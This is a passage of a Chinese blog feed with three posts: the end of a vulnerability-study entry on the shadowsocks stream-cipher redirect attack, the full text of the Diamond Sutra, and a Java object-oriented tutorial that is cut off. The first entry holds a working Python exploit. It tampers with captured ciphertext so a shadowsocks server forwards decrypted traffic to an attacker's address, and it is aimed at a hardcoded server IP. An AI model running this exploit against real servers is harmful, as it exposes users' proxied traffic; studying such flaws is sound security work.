<li>https请求：attack2_with_https_pocket.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">s1,s2</span>):</span></span><br><span class="line">	n=<span class="built_in">len</span>(s1)</span><br><span class="line">	r=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">		r+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[i])^<span class="built_in">ord</span>(s2[i]))</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line">method=<span class="string">&#x27;aes-256-cfb&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span>(<span class="params">c</span>):</span></span><br><span class="line">    l=<span class="number">16</span>-<span class="built_in">len</span>(c)%<span class="number">16</span></span><br><span class="line">    c=c+<span class="string">&#x27;\x00&#x27;</span>*l</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#c is a capture http packet.</span></span><br><span class="line">c=<span class="string">&#x27;b338f754455478c1fdb1dc11f300050ce303ea8d9bdfdd2afa64cf257184c0e79f1b10f528abaa&#x27;</span></span><br><span class="line">c=c.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">c=up(c)</span><br><span class="line">c1=<span class="string">&#x27;8a6db90928015d006b6f1998dcc71e19a25e201ca2a2560dc99ccfa48e8d300723af80bbbf2ecfb154c3fa67c05450874c279efe990fe85a516e1d25a94cf4848997a8ecfb0b339f7e50f805fb79ab97c370fab07751da5e72059fd28a5977635400e7d87d1dd69ca5bfc6af3f9b41bd07062365ad4cf1feef7eeb5d79ec0f1c6b1f2c62489cd319fa1138dd271aea22747463ae3e1aa5e2aea6ec519715431cd6b94ca1677878eb3ab5436b04f505b4aeb73f46bb8a665d4bc9d7d6eff180fabbd8e1f052876f48bfa48ba63c2941eaec73f72593572d8d1125e2b0fbd327d99c1e54921fe70007a0fcfdc174cba65ba1984f44f8f78bd372e0f8aa09c65e0189e587b1875e791a583830d02e5d25067e1932743cc889dd5efe73fa3b034668cb7970cf344a557e82bc3bfdb669943586cb14a5c0baded64eb4388b5df920db87006ac2341c8cb40a6c4b4cfff6de0851e6dee1527556a2cbfff423051856120e1533d53cefa468577dbda680f4a29fab203dc1b4072ae0bd48810b5ec3d9830ecad310c7ee63bb6c10aa1a9e8718b2b6b1a651a8f65649604258b1ed508928c4259c35496c9eeb6c924891101212c1f73d254d843322863f00af45743b674eb34c1a28abc74e7373d6376ebeff346ec7e1b8698a2cb812a64b00c24ada0df99d76241916c093e0d03bbf6ffff8463db25b52e75c2dbcc5a80ccc203d052eec6b9a3043dc5667cf3fbaeebe8d2d20c767b77b51c64bc73a706f16f6a2b851e24d99b1ec66bfec&#x27;</span></span><br><span class="line">c=c+c1.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">prefix_http=<span class="string">&#x27;HTTP/1.&#x27;</span></span><br><span class="line">prefix_https_send=<span class="string">&#x27;\x16\x03\x01\x02\x00\x01\x00&#x27;</span></span><br><span class="line"><span class="comment">#targetIP=&#x27;\x01\xc0\xa8\x01\x03\x12\x12&#x27;# malicous target IP address: 192.168.1.3:4626</span></span><br><span class="line"><span class="comment">#targetIP=&#x27;\x01\x23\xbd\xa0\x6b\x1f\x90&#x27;</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">y=c[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]</span><br><span class="line">serverip=<span class="string">&quot;13.70.25.143&quot;</span></span><br><span class="line">serverport=<span class="number">8080</span></span><br><span class="line">targetIP=<span class="string">&#x27;\x01\x2f\x34\xab\x43\x12\x12&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>,<span class="number">120</span>,<span class="number">1</span>):</span><br><span class="line">	prefix_https_recv=<span class="string">&#x27;\x16\x03\x03\x01&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;\x02\x00&#x27;</span></span><br><span class="line">	x=xor(prefix_https_recv,targetIP)</span><br><span class="line">	z=xor(x,y)</span><br><span class="line">	cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line">	obj = socket.socket()</span><br><span class="line">	obj.connect((serverip,serverport))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">	<span class="built_in">print</span> (i)</span><br><span class="line">	obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">	time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">        prefix_https_recv=<span class="string">&#x27;\x16\x03\x03\x00&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;\x02\x00&#x27;</span></span><br><span class="line">	x=xor(prefix_https_recv,targetIP)</span><br><span class="line">	z=xor(x,y)</span><br><span class="line">	cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line">	obj = socket.socket()</span><br><span class="line">	obj.connect((serverip,serverport))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">	<span class="built_in">print</span> (i)</span><br><span class="line">	obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">	time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="更新-漏洞复现"><a href="#更新-漏洞复现" class="headerlink" title="更新-漏洞复现"></a>更新-漏洞复现</h2><p>参考博文：<a href="https://www.leadroyal.cn/?p=1036">https://www.leadroyal.cn/?p=1036</a><br>这个作者提供了<a href="https://github.com/LeadroyaL/ss-redirect-vuln-exp">exp</a>，讲得挺详细，以后有兴趣了跟着操作一遍。</p>
]]></content>
      <categories>
        <category>每日漏洞学习</category>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>漏洞学习</tag>
        <tag>shadowsocks流加密</tag>
        <tag>重定向攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>金刚经</title>
    <url>//posts/ZH-CN/Think_phylo.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早就想读《金刚经》，原本以为是一本大书，原来只有32个简短的对话。果然，智者就是不啰嗦。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="全文"><a href="#全文" class="headerlink" title="全文"></a>全文</h2><p>金刚经 第一品 法会因由分</p>
<p>如是我闻，一时，佛在舍卫国祗树给孤独园，与大比丘众千二百五十人俱。尔时，世尊食时，著衣持钵，入舍卫大城乞食。于其城中，次第乞已，还至本处。饭食讫，收衣钵，洗足已，敷座而坐。</p>
<p>　</p>
<p>金刚经 第二品 善现启请分</p>
<p>时，长老须菩提在大众中即从座起，偏袒右肩，右膝着地，合掌恭敬而白佛言：“希有！世尊！如来善护念诸菩萨，善付嘱诸菩萨。世尊！善男子、善女人，发阿耨多罗三藐三菩提心，云何应住，云何降伏其心？”佛言：“善哉，善哉。须菩提！如汝所说，如来善护念诸菩萨，善付嘱诸菩萨。汝今谛听！当为汝说：善男子、善女人，发阿耨多罗三藐三菩提心，应如是住，如是降伏其心。”“唯然，世尊！愿乐欲闻。”</p>
<p>　</p>
<p>金刚经 第三品 大乘正宗分</p>
<p>佛告须菩提：“诸菩萨摩诃萨应如是降伏其心！所有一切众生之类：若卵生、若胎生、若湿生、若化生；若有色、若无色；若有想、若无想、若非有想非无想，我皆令入无余涅盘而灭度之。如是灭度无量无数无边众生，实无众生得灭度者。何以故？须菩提！若菩萨有我相、人相、众生相、寿者相，即非菩萨。”</p>
<p>　</p>
<p>金刚经 第四品 妙行无住分</p>
<p>“复次，须菩提！菩萨于法，应无所住，行于布施，所谓不住色布施，不住声香味触法布施。须菩提！菩萨应如是布施，不住于相。何以故？若菩萨不住相布施，其福德不可思量。须菩提！于意云何？东方虚空可思量不？”“不也，世尊！”“须菩提！南西北方四维上下虚空可思量不？”“不也，世尊！”“须菩提！菩萨无住相布施，福德亦复如是不可思量。须菩提！菩萨但应如所教住。”</p>
<p>　</p>
<p>金刚经 第五品 如理实见分</p>
<p>“须菩提！于意云何？可以身相见如来不？”“不也，世尊！不可以身相得见如来。何以故？如来所说身相，即非身相。”佛告须菩提：“凡所有相，皆是虚妄。若见诸相非相，即见如来。”</p>
<p>　</p>
<p>金刚经 第六品 正信希有分</p>
<p>须菩提白佛言：“世尊！颇有众生，得闻如是言说章句，生实信不？”佛告须菩提：“莫作是说。如来灭后，后五百岁，有持戒修福者，于此章句能生信心，以此为实，当知是人不于一佛二佛三四五佛而种善根，已于无量千万佛所种诸善根，闻是章句，乃至一念生净信者，须菩提！如来悉知悉见，是诸众生得如是无量福德。何以故？是诸众生无复我相、人相、众生相、寿者相；无法相，亦无非法相。何以故？是诸众生若心取相，则为著我人众生寿者。若取法相，即著我人众生寿者。何以故？若取非法相，即著我人众生寿者，是故不应取法，不应取非法。以是义故，如来常说：‘汝等比丘，知我说法，如筏喻者；法尚应舍，何况非法。’”</p>
<p>　</p>
<p>金刚经 第七品 无得无说分</p>
<p>“须菩提！于意云何？如来得阿耨多罗三藐三菩提耶？如来有所说法耶？”须菩提言：“如我解佛所说义，无有定法名阿耨多罗三藐三菩提，亦无有定法，如来可说。何以故？如来所说法，皆不可取、不可说、非法、非非法。所以者何？一切圣贤，皆以无为法而有差别。”</p>
<p>　</p>
<p>金刚经 第八品 依法出生分</p>
<p>“须菩提！于意云何？若人满三千大千世界七宝以用布施，是人所得福德，宁为多不？”须菩提言：“甚多，世尊！何以故？是福德即非福德性，是故如来说福德多。”“若复有人，于此经中受持，乃至四句偈等，为他人说，其福胜彼。何以故？须菩提！一切诸佛，及诸佛阿耨多罗三藐三菩提法，皆从此经出。须菩提！所谓佛法者，即非佛法。”</p>
<p>　</p>
<p>金刚经 第九品 一相无相分</p>
<p>“须菩提！于意云何？须陀洹能作是念：‘我得须陀洹果’不？”须菩提言：“不也，世尊！何以故？须陀洹名为入流，而无所入，不入色声香味触法，是名须陀洹。”“须菩提！于意云何？斯陀含能作是念：‘我得斯陀含果’不？”须菩提言：不也，世尊！何以故？斯陀含名一往来，而实无往来，是名斯陀含。”“须菩提！于意云何？阿那含能作是念：‘我得阿那含果’不？”须菩提言：“不也，世尊！何以故？阿那含名为不来，而实无不来，是名阿那含。”“须菩提！于意云何？阿罗汉能作是念，‘我得阿罗汉道’不？”须菩提言：“不也，世尊！何以故？实无有法名阿罗汉。世尊！若阿罗汉作是念：‘我得阿罗汉道’，即著我人众生寿者。世尊！佛说我得无诤三昧，人中最为第一，是第一离欲阿罗汉。我不作是念：‘我是离欲阿罗汉’。世尊！我若作是念：‘我得阿罗汉道’，世尊则不说须菩提是乐阿兰那行者！以须菩提实无所行，而名须菩提是乐阿兰那行。</p>
<p>　</p>
<p>金刚经 第十品 庄严净土分</p>
<p>佛告须菩提：“于意云何？如来昔在然灯佛所，于法有所得不？”“不也，世尊！如来在然灯佛所，于法实无所得。”“须菩提！于意云何？菩萨庄严佛土不？”“不也，世尊！何以故？庄严佛土者，即非庄严，是名庄严。”“是故须菩提！诸菩萨摩诃萨应如是生清净心，不应住色生心，不应住声香味触法生心，应无所住而生其心。须菩提！譬如有人，身如须弥山王，于意云何？是身为大不？”须菩提言：“甚大，世尊！何以故？佛说非身，是名大身。”</p>
<p>　</p>
<p>金刚经 第十一品 无为福胜分</p>
<p>“须菩提！如恒河中所有沙数，如是沙等恒河，于意云何？是诸恒河沙宁为多不？”须菩提言：“甚多，世尊！但诸恒河尚多无数，何况其沙。”“须菩提！我今实言告汝：若有善男子、善女人，以七宝满尔所恒河沙数三千大千世界，以用布施，得福多不？”须菩提言：“甚多，世尊！”佛告须菩提：“若善男子、善女人，于此经中，乃至受持四句偈等，为他人说，而此福德胜前福德。”</p>
<p>　</p>
<p>金刚经 第十二品 尊重正教分</p>
<p>“复次，须菩提！随说是经，乃至四句偈等，当知此处，一切世间、天人、阿修罗，皆应供养，如佛塔庙，何况有人尽能受持读诵。须菩提！当知是人成就最上第一希有之法，若是经典所在之处，则为有佛，若尊重弟子。”</p>
<p>　</p>
<p>金刚经 第十三品 如法受持分</p>
<p>尔时，须菩提白佛言：“世尊！当何名此经，我等云何奉持？”佛告须菩提：“是经名为《金刚般若波罗蜜》，以是名字，汝当奉持。所以者何？须菩提！佛说般若波罗蜜，即非般若波罗蜜。须菩提！于意云何？如来有所说法不？”须菩提白佛言：“世尊！如来无所说。”“须菩提！于意云何？三千大千世界所有微尘是为多不？”须菩提言：“甚多，世尊！”“须菩提！诸微尘，如来说非微尘，是名微尘。如来说：世界，非世界，是名世界。须菩提！于意云何？可以三十二相见如来不？”“不也，世尊！何以故？如来说：三十二相，即是非相，是名三十二相。”“须菩提！若有善男子、善女人，以恒河沙等身命布施；若复有人，于此经中，乃至受持四句偈等，为他人说，其福甚多。”</p>
<p>　</p>
<p>金刚经 第十四品 离相寂灭分</p>
<p>尔时，须菩提闻说是经，深解义趣，涕泪悲泣，而白佛言：“希有，世尊！佛说如是甚深经典，我从昔来所得慧眼，未曾得闻如是之经。世尊！若复有人得闻是经，信心清净，则生实相，当知是人，成就第一希有功德。世尊！是实相者，即是非相，是故如来说名实相。世尊！我今得闻如是经典，信解受持不足为难，若当来世，后五百岁，其有众生，得闻是经，信解受持，是人则为第一希有。<br>何以故？此人无我相、人相、众生相、寿者相。所以者何？我相即是非相、人相、众生相、寿者相，即是非相。何以故？离一切诸相，则名诸佛。”佛告须菩提：“如是！如是！若复有人得闻是经，不惊、不怖、不畏，当知是人甚为希有。何以故？须菩提！如来说第一波罗蜜，非第一波罗蜜，是名第一波罗蜜。须菩提！忍辱波罗蜜，如来说非忍辱波罗蜜，是名忍辱波罗蜜。何以故？须菩提！如我昔为歌利王割截身体，我于尔时，无我相、无人相、无众生相、无寿者相。何以故？<br>我于往昔节节支解时，若有我相、人相、众生相、寿者相，应生嗔恨。须菩提！又念过去于五百世作忍辱仙人，于尔所世，无我相、无人相、无众生相、无寿者相。是故须菩提！菩萨应离一切相，发阿耨多罗三藐三菩提心，不应住色生心，不应住声香味触法生心，应生无所住心。若心有住，即为非住。是故佛说：‘菩萨心不应住色布施。’须菩提！菩萨为利益一切众生，应如是布施。如来说：一切诸相，即是非相。又说：一切众生，即非众生。须菩提！如来是真语者、实语者、如语者、不诳语者、不异语者。须菩提！如来所得法，此法无实无虚。须菩提，若菩萨心住于法而行布施，如人入暗，即无所见。若菩萨心不住法而行布施，如人有目，日光明照，见种种色。须菩提！当来之世，若有善男子、善女人，能于此经受持读诵，则为如来以佛智慧，悉知是人，悉见是人，皆得成就无量无边功德。”</p>
<p>　</p>
<p>金刚经 第十五品 持经功德分</p>
<p>“须菩提！若有善男子、善女人，初日分以恒河沙等身布施，中日分复以恒河沙等身布施，后日分亦以恒河沙等身布施，如是无量百千万亿劫以身布施；若复有人，闻此经典，信心不逆，其福胜彼，何况书写、受持、读诵、为人解说。须菩提！以要言之，是经有不可思议、不可称量、无边功德。如来为发大乘者说，为发最上乘者说。若有人能受持读诵，广为人说，如来悉知是人，悉见是人，皆得成就不可量、不可称、无有边、不可思议功德。如是人等，即为荷担如来阿耨多罗三藐三菩提。<br>何以故？须菩提！若乐小法者，著我见、人见、众生见、寿者见，则于此经，不能听受读诵、为人解说。须菩提！在在处处，若有此经，一切世间、天、人、阿修罗，所应供养；当知此处则为是塔，皆应恭敬，作礼围绕，以诸华香而散其处。”</p>
<p>　</p>
<p>金刚经 第十六品 能净业障分</p>
<p>“复次，须菩提！若善男子、善女人，受持读诵此经，若为人轻贱，是人先世罪业，应堕恶道，以今世人轻贱故，先世罪业则为消灭，当得阿耨多罗三藐三菩提。”“须菩提！我念过去无量阿僧祗劫，于然灯佛前，得值八百四千万亿那由他诸佛，悉皆供养承事，无空过者，若复有人， 于后末世，能受持读诵此经，所得功德，于我所供养诸佛功德，百分不及一，千万亿分、乃至算数譬喻所不能及。须菩提！若善男子、善女人，于后末世，有受持读诵此经，所得功德，我若具说者，或有人闻，心即狂乱，狐疑不信。须菩提！当知是经义不可思议，果报亦不可思议。”</p>
<p>　</p>
<p>金刚经 第十七品 究竟无我分</p>
<p>尔时，须菩提白佛言：“世尊！善男子、善女人，发阿耨多罗三藐三菩提心，云何应住？云何降伏其心？”佛告须菩提：“善男子、善女人，发阿耨多罗三藐三菩提者，当生如是心，我应灭度一切众生。灭度一切众生已，而无有一众生实灭度者。<br>何以故？须菩提！若菩萨有我相、人相、众生相、寿者相，即非菩萨。<br>所以者何？须菩提！实无有法发阿耨多罗三藐三菩提者。”“须菩提！于意云何？如来于然灯佛所，有法得阿耨多罗三藐三菩提不？”“不也，世尊！如我解佛所说义，佛于然灯佛所，无有法得阿耨多罗三藐三菩提。”佛言：“如是！如是！须菩提！实无有法如来得阿耨多罗三藐三菩提。须菩提！若有法得阿耨多罗三藐三菩提，然灯佛则不与我授记：汝于来世，当得作佛，号释迦牟尼。以实无有法得阿耨多罗三藐三菩提，是故然灯佛与我授记，作是言：‘汝于来世，当得作佛，号释迦牟尼。’<br>何以故？如来者，即诸法如义。若有人言：‘如来得阿耨多罗三藐三菩提’。须菩提！实无有法，佛得阿耨多罗三藐三菩提。须菩提！如来所得阿耨多罗三藐三菩提，于是中无实无虚。是故如来说：一切法皆是佛法。须菩提！所言一切法者，即非一切法，是故名一切法。须菩提！譬如人身长大。”须菩提言：“世尊！如来说：人身长大，即为非大身，是名大身。”“须菩提！菩萨亦如是。若作是言：‘我当灭度无量众生’，即不名菩萨。<br>何以故？须菩提！无有法名为菩萨。是故佛说：一切法无我、无人、无众生、无寿者。须菩提！若菩萨作是言，‘我当庄严佛土’，是不名菩萨。<br>何以故？如来说：庄严佛土者，即非庄严，是名庄严。须菩提！若菩萨通达无我法者，如来说名真是菩萨。</p>
<p>　</p>
<p>金刚经 第十八品 一体同观分</p>
<p>“须菩提！于意云何？如来有肉眼不？”<br>“如是，世尊！如来有肉眼。”<br>“须菩提！于意云何？如来有天眼不？”<br>“如是，世尊！如来有天眼。”<br>“须菩提！于意云何？如来有慧眼不？”<br>“如是，世尊！如来有慧眼。”<br>“须菩提！于意云何？如来有法眼不？”<br>“如是，世尊！如来有法眼。”<br>“须菩提！于意云何？如来有佛眼不？”<br>“如是，世尊！如来有佛眼。”<br>“须菩提！于意云何？恒河中所有沙，佛说是沙不？”<br>“如是，世尊！如来说是沙。”<br>“须菩提！于意云何？如一恒河中所有沙，有如是等恒河，是诸恒河所有沙数，佛世界如是，宁为多不？”“甚多，世尊！”佛告须菩提：“尔所国土中，所有众生，若干种心，如来悉知。何以故？如来说：诸心皆为非心，是名为心。所以者何？须菩提！过去心不可得，现在心不可得，未来心不可得。”</p>
<p>　</p>
<p>金刚经 第十九品 法界通分分</p>
<p>“须菩提！于意云何？若有人满三千大千世界七宝以用布施，是人以是因缘，得福多不？”“如是，世尊！此人以是因缘，得福甚多。”“须菩提！若福德有实，如来不说得福德多；以福德无故，如来说得福德多。”</p>
<p>　</p>
<p>金刚经 第二十品 离色离相分</p>
<p>“须菩提！于意云何？佛可以具足色身见不？”“不也，世尊！如来不应以具足色身见。何以故？如来说：具足色身，即非具足色身，是名具足色身。”“须菩提！于意云何？如来可以具足诸相见不？”“不也，世尊！如来不应以具足诸相见。何以故？如来说：诸相具足，即非具足，是名诸相具足。”</p>
<p>　</p>
<p>金刚经 第二十一品 非说所说分</p>
<p>“须菩提！汝勿谓如来作是念：‘我当有所说法。’莫作是念，何以故？若人言：如来有所说法，即为谤佛，不能解我所说故。须菩提！说法者，无法可说，是名说法。”尔时，慧命须菩提白佛言：“世尊！颇有众生，于未来世，闻说是法，生信心不？”佛言：“须菩提！彼非众生，非不众生。何以故？须菩提！众生众生者，如来说非众生，是名众生。”</p>
<p>　</p>
<p>金刚经 第二十二品 无法可得分</p>
<p>须菩提白佛言：“世尊！佛得阿耨多罗三藐三菩提，为无所得耶？”佛言：“如是，如是。须菩提！我于阿耨多罗三藐三菩提乃至无有少法可得，是名阿耨多罗三藐三菩提。”</p>
<p>　</p>
<p>金刚经 第二十三品 净心行善分</p>
<p>复次，须菩提！是法平等，无有高下，是名阿耨多罗三藐三菩提；以无我、无人、无众生、无寿者，修一切善法，即得阿耨多罗三藐三菩提。须菩提！所言善法者，如来说即非善法，是名善法。</p>
<p>　</p>
<p>金刚经 第二十四品 福智无比分</p>
<p>“须菩提！若三千大千世界中所有诸须弥山王，如是等七宝聚，有人持用布施；若人以此《般若波罗蜜经》，乃至四句偈等，受持、为他人说，于前福德百分不及一，百千万亿分，乃至算数譬喻所不能及。”</p>
<p>　</p>
<p>金刚经 第二十五品 化无所化分</p>
<p>“须菩提！于意云何？汝等勿谓如来作是念：‘我当度众生。’须菩提！莫作是念。何以故？实无有众生如来度者。若有众生如来度者，如来则有我、人、众生、寿者。须菩提！如来说：‘有我者，则非有我，而凡夫之人以为有我。’须菩提！凡夫者，如来说即非凡夫。”</p>
<p>　</p>
<p>金刚经 第二十六品 法身非相分</p>
<p>“须菩提！于意云何？可以三十二相观如来不？”须菩提言：“如是！如是！以三十二相观如来。”佛言：“须菩提！若以三十二相观如来者，转轮圣王即是如来。”须菩提白佛言：“世尊！如我解佛所说义，不应以三十二相观如来。”尔时，世尊而说偈言：“若以色见我，以音声求我，是人行邪道，不能见如来”</p>
<p>　</p>
<p>金刚经 第二十七品 无断无灭分</p>
<p>“须菩提！汝若作是念：‘如来不以具足相故，得阿耨多罗三藐三菩提。’须菩提！莫作是念，‘如来不以具足相故，得阿耨多罗三藐三菩提。’须菩提！汝若作是念，发阿耨多罗三藐三菩提心者，说诸法断灭。莫作是念！何以故？发阿耨多罗三藐三菩提心者，于法不说断灭相。”</p>
<p>　</p>
<p>金刚经 第二十八品 不受不贪分</p>
<p>“须菩提！若菩萨以满恒河沙等世界七宝布施；若复有人知一切法无我，得成于忍，此菩萨胜前菩萨所得功德。须菩提！以诸菩萨不受福德故。”须菩提白佛言：“世尊！云何菩萨不受福德？”“须菩提！菩萨所作福德，不应贪著，是故说不受福德。”</p>
<p>　</p>
<p>金刚经 第二十九品 威仪寂净分</p>
<p>“须菩提！若有人言：如来若来若去、若坐若卧，是人不解我所说义。何以故？如来者，无所从来，亦无所去，故名如来。”</p>
<p>　</p>
<p>金刚经 第三十品 一合理相分</p>
<p>“须菩提！若善男子、善女人，以三千大千世界碎为微尘，于意云何？是微尘众宁为多不？”“甚多，世尊！何以故？若是微尘众实有者，佛则不说是微尘众，所以者何？佛说：微尘众，即非微尘众，是名微尘众。世尊！如来所说三千大千世界，即非世界，是名世界。何以故？若世界实有，即是一合相。如来说：‘一合相，即非一合相，是名一合相。’须菩提！一合相者，即是不可说，但凡夫之人贪著其事。”</p>
<p>　</p>
<p>金刚经 第三十一品 知见不生分</p>
<p>“须菩提！若人言：佛说我见、人见、众生见、寿者见。须菩提！于意云何？是人解我所说义不？”“不也，世尊！是人不解如来所说义。何以故？世尊说：我见、人见、众生见、寿者见，即非我见、人见、众生见、寿者见，是名我见、人见、众生见、寿者见。”“须菩提！发阿耨多罗三藐三菩提心者，于一切法，应如是知，如是见，如是信解，不生法相。须菩提！所言法相者，如来说即非法相，是名法相。”</p>
<p>　</p>
<p>金刚经 第三十二品 应化非真分</p>
<p>“须菩提！若有人以满无量阿僧祗世界七宝持用布施，若有善男子、善女人发菩提心者，持于此经，乃至四句偈等，受持读诵，为人演说，其福胜彼。云何为人演说，不取于相，如如不动。何以故？”“一切有为法，如梦幻泡影，如露亦如电，应作如是观”佛说是经已，长老须菩提及诸比丘、比丘尼、优婆塞、优婆夷，一切世间、天、人、阿修罗，闻佛所说，皆大欢喜，信受奉行。</p>
]]></content>
      <categories>
        <category>金刚经</category>
      </categories>
      <tags>
        <tag>金刚经</tag>
      </tags>
  </entry>
  <entry>
    <title>java编程学习之面向对象编程</title>
    <url>//posts/ZH-CN/Java_Object.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天我们快速入门了，今天继续学习基础知识，面向对象编程到底是怎么面向的？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="面向对象基础"><a href="#面向对象基础" class="headerlink" title="面向对象基础"></a>面向对象基础</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>一个class可以包含多个field，例如，我们给Person类就定义了两个field：<br>class Person {<br>    public String name;<br>    public int age;<br>}<br>直接把field用public暴露给外部可能会破坏封装性。为了避免外部代码直接去访问field，我们可以用private修饰field，拒绝外部访问。<br>简单讲，就是函数体内的变量，不能由外部直接访问，这样太危险了，得有个中间人。于是就通过<code>方法</code>连接<code>private</code>和<code>public</code>。</p>
<ul>
<li>举例<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrivatePublic</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person ming = <span class="keyword">new</span> Person();</span><br><span class="line">        ming.setName(<span class="string">&quot;Xiao Ming&quot;</span>); <span class="comment">// 设置name</span></span><br><span class="line">        ming.setAge(<span class="number">120</span>); <span class="comment">// 设置age</span></span><br><span class="line">        System.out.println(ming.getName() + <span class="string">&quot;, &quot;</span> + ming.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">//private变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age; <span class="comment">//private变量</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="comment">//使用这个方法，返回private变量的值，相当于把private变量public化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name; <span class="comment">//this指的就是当前实例：Person</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="comment">//使用这个方法，设置name的值，相当于赋值的过程</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">0</span> || age &gt; <span class="number">100</span>) &#123; <span class="comment">//如果传入的参数age不符合条件，则程序抛出异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;invalid age value&quot;</span>); <span class="comment">//这是抛出异常的提示信息</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3a12061aj31f60u0td0.jpg" alt="image.png"></li>
<li>可变参数<br>可变参数，意思就是这个参数的值不确定。比如传入的参数是数组，不确定数组大小时，就要用可变参数。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] names;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNames</span><span class="params">(String... names)</span> </span>&#123; <span class="comment">//String...指的就是传入参数是一个大小不确定的数组</span></span><br><span class="line">        <span class="keyword">this</span>.names = names;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用方法</span></span><br><span class="line">Group g = <span class="keyword">new</span> Group();</span><br><span class="line">g.setNames(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="string">&quot;Xiao Hong&quot;</span>, <span class="string">&quot;Xiao Jun&quot;</span>); <span class="comment">// 传入3个String</span></span><br><span class="line">g.setNames(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="string">&quot;Xiao Hong&quot;</span>); <span class="comment">// 传入2个String</span></span><br><span class="line">g.setNames(<span class="string">&quot;Xiao Ming&quot;</span>); <span class="comment">// 传入1个String</span></span><br><span class="line">g.setNames(); <span class="comment">// 传入0个String</span></span><br></pre></td></tr></table></figure>
等价于：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] names;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNames</span><span class="params">(String[] names)</span> </span>&#123; <span class="comment">//String...和String[]这两种写法都对</span></span><br><span class="line">        <span class="keyword">this</span>.names = names;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 